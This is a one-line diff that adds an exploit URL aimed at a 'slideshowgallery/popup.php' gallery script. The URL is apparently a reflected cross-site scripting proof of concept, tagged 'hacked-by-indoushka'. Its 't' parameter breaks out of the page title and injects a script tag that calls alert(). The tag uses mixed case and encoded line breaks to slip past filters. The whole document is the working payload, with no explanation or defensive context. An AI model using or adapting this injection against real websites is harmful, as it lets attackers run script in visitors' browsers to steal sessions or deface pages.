@@ -1,0 +1,1 @@
+http://www.example.com/slideshowgallery/popup.php?img=imagefolder1%2Fkoalalikefather%2Ejpg&amp;w=215&amp;h=162&amp;t=hacked-by-indoushka&lt;/title&gt;&lt;ScRiPt%20%0d%0a&gt;alert(213771818860)%3B&lt;/ScRiPt&gt;
